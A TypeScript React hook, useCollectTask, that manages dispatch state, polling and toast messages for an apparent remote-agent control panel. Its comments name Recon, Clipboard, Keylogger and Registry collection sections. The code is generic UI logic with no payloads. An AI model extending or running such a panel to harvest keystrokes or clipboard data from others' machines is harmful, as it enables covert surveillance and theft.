"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import { api } from "@/lib/api";
import { collectTaskResult } from "./task-collect";

export interface CollectOptions {
  body?: Record<string, string>;
  timeoutMs?: number;
  /** Fallback text when the task completes with empty output. */
  emptyText?: string;
  /** Success toast; omitted = silent. */
  successText?: string;
  /** Failure toast override; defaults to the error message. */
  errorText?: string;
  /** Store the output in `result` (default true). Set false for control
   * actions (start/stop) whose ack text must not replace the last dump. */
  storeResult?: boolean;
}

function isAbort(e: unknown): boolean {
  return e instanceof Error && e.name === "AbortError";
}

/**
 * Shared dispatch state for the agent detail "collect" sections
 * (Recon / Clipboard / Keylogger / Registry / …).
 *
 * - `collect(key, path, opts)`: POST → poll → GET task, stores the result.
 * - `fire(key, path, body?, successText?)`: fire-and-forget POST for
 *   trigger-style endpoints that ack without a usable task result.
 * - `key` identifies the in-flight action so callers can show per-button
 *   spinners while `busy !== null` disables the rest.
 */
export function useCollectTask(agentId: string) {
  const [busy, setBusy] = useState<string | null>(null);
  const [result, setResult] = useState<string | null>(null);
  const busyRef = useRef<string | null>(null);
  const mountedRef = useRef(true);

  useEffect(() => () => {
    mountedRef.current = false;
  }, []);

  const finish = useCallback((value: string | null) => {
    busyRef.current = null;
    if (mountedRef.current) {
      if (value !== null) setResult(value);
      setBusy(null);
    }
  }, []);

  const collect = useCallback(
    async (key: string, path: string, opts: CollectOptions = {}): Promise<string | null> => {
      if (!agentId || busyRef.current) return null;
      busyRef.current = key;
      setBusy(key);
      try {
        const out = await collectTaskResult(agentId, path, opts.body, opts.timeoutMs);
        const value = out || opts.emptyText || "";
        if (opts.successText && mountedRef.current) toast.success(opts.successText);
        finish(opts.storeResult === false ? null : value);
        return value;
      } catch (e) {
        if (!isAbort(e) && mountedRef.current) {
          toast.error(opts.errorText || (e instanceof Error ? e.message : "collection failed"));
        }
        busyRef.current = null;
        if (mountedRef.current) setBusy(null);
        return null;
      }
    },
    [agentId, finish],
  );

  const fire = useCallback(
    async (key: string, path: string, body: Record<string, string> = {}, successText?: string): Promise<boolean> => {
      if (!agentId || busyRef.current) return false;
      busyRef.current = key;
      setBusy(key);
      try {
        await api.post(path, body);
        if (successText && mountedRef.current) toast.success(successText);
        return true;
      } catch (e) {
        if (mountedRef.current) {
          toast.error(e instanceof Error ? e.message : "request failed");
        }
        return false;
      } finally {
        busyRef.current = null;
        if (mountedRef.current) setBusy(null);
      }
    },
    [agentId],
  );

  const reset = useCallback(() => setResult(null), []);

  return { busy, result, setResult, reset, collect, fire };
}
